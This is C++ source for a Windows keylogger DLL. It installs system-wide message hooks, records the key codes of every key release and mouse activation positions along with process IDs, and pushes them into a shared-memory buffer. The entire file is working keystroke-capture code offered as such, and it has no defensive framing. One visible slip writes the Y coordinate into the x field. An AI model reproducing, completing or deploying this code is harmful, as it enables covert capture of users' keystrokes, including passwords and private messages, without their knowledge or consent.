#include "stdafx.h"
#include "KeyloggerDll.h"
#include <Windowsx.h>

#include <sstream>

KeyloggerDll::KeyloggerDll(HMODULE hModule) :
_shm("lllol")
{
	this->_hModule = hModule;
	OutputDebugStringW(L"CTOR");
}

KeyloggerDll::~KeyloggerDll()
{
	//UnhookWindowsHookEx(_hook);
	OutputDebugStringW(L"Unhooked");
}

void	KeyloggerDll::setModuleHandle(HMODULE hModule)
{
	this->_hModule = hModule;
}

LRESULT CALLBACK KeyloggerDll::GetMsgProc(int nCode, WPARAM wParam, LPARAM lParam)
{
	MSG *msg = (MSG*)lParam;
	if (nCode >= 0 && msg->message == WM_KEYUP)
	{
		Data		data;

		data.pid = GetCurrentProcessId();
		data.t = KEYPRESS;
		data.data.key.keyCode = msg->wParam;
		_shm.push(data);
	}
	return CallNextHookEx(this->_postMsgHook, nCode, wParam, lParam);
}

LRESULT CALLBACK KeyloggerDll::CallWndProc(
	_In_  int nCode,
	_In_  WPARAM wParam,
	_In_  LPARAM lParam
	)
{
	CWPSTRUCT	*cwp = (CWPSTRUCT*)lParam;
	if (nCode >= 0 && cwp->message == WM_MOUSEACTIVATE)
	{
		Data test;

		test.pid = GetCurrentProcessId();
		test.t = MOUSELOG;
		test.data.mouse.x = GET_X_LPARAM(cwp->lParam);
		test.data.mouse.x = GET_Y_LPARAM(cwp->lParam);
		_shm.push(test);
	}
	return CallNextHookEx(this->_getMsgHook, nCode, wParam, lParam);
}

int KeyloggerDll::loadHook()
{
	if (!(this->_getMsgHook = SetWindowsHookEx(WH_CALLWNDPROC, CallWndProcFn, _hModule, 0)))
	{
		MessageBox(NULL, L"Failed to install hook!", L"Error", MB_ICONERROR);
	}
	if (!(this->_postMsgHook = SetWindowsHookEx(WH_GETMESSAGE, GetMsgProcFn, _hModule, 0)))
	{
		MessageBox(NULL, L"Failed to install hook!", L"Error", MB_ICONERROR);
	}
	return 0;
}

void	KeyloggerDll::MessageLoop()
{
	MSG uMsg;
	while (GetMessage(&uMsg, NULL, 0, 0) > 0)
	{
		TranslateMessage(&uMsg);
		DispatchMessage(&uMsg);
	}
}
